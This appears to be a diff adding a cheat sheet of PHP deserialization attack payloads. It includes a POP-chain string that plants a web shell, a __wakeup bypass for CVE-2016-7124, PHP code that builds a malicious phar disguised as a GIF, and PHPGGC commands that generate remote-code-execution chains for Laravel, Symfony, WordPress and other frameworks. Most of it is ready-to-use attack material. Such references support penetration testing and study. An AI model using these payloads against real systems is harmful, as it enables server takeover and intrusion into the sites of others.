@@ -1,0 +1,61 @@
+# PHP Deserialization Payloads
+
+# ============ Detection ============
+# Look for: unserialize(), maybe_unserialize()
+# PHP serialized format: O:4:"User":2:{s:4:"name";s:4:"test";s:3:"age";i:25;}
+
+# ============ Basic Object Injection ============
+# If class User has __wakeup() or __destruct() magic methods
+O:4:"User":1:{s:4:"name";s:4:"test";}
+
+# ============ POP Chain Example ============
+# Exploit __destruct() -> file_put_contents()
+O:8:"Vuln":2:{s:4:"file";s:14:"/var/www/x.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}
+
+# ============ Magic Methods to Look For ============
+# __wakeup()    - Called on unserialize()
+# __destruct()  - Called when object is destroyed
+# __toString()  - Called when object is treated as string
+# __call()      - Called when inaccessible method is called
+# __get()       - Called when reading inaccessible property
+# __set()       - Called when writing inaccessible property
+
+# ============ Bypass __wakeup (CVE-2016-7124) ============
+# PHP < 5.6.25 / 7.0.10
+# Increase property count to skip __wakeup()
+# Original: O:4:"User":1:{s:4:"name";s:4:"test";}
+# Bypass:   O:4:"User":2:{s:4:"name";s:4:"test";}
+
+# ============ Phar Deserialization ============
+# Upload .phar file, then trigger with phar:// wrapper
+# file_exists('phar://uploads/evil.phar')
+# file_get_contents('phar://uploads/evil.phar')
+# Any file operation function can trigger
+
+# Generate malicious phar:
+<?php
+class Evil { public $cmd = 'id'; }
+$phar = new Phar('evil.phar');
+$phar->startBuffering();
+$phar->setStub('GIF89a<?php __HALT_COMPILER();');
+$phar->setMetadata(new Evil());
+$phar->addFromString('test.txt', 'test');
+$phar->stopBuffering();
+?>
+
+# ============ Tools ============
+# PHPGGC - PHP Generic Gadget Chains
+# https://github.com/ambionics/phpggc
+./phpggc -l                              # List available chains
+./phpggc Laravel/RCE1 system id          # Generate payload
+./phpggc -p phar Laravel/RCE1 system id  # Generate phar
+./phpggc -b Laravel/RCE1 system id       # Base64 output
+
+# Common frameworks:
+./phpggc Symfony/RCE1 'id'
+./phpggc Laravel/RCE1 system 'id'
+./phpggc Wordpress/RCE1 'id'
+./phpggc Magento/SQLI1 'id'
+./phpggc Guzzle/RCE1 'id'
+./phpggc Monolog/RCE1 'id'
+./phpggc Doctrine/RCE1 'id'
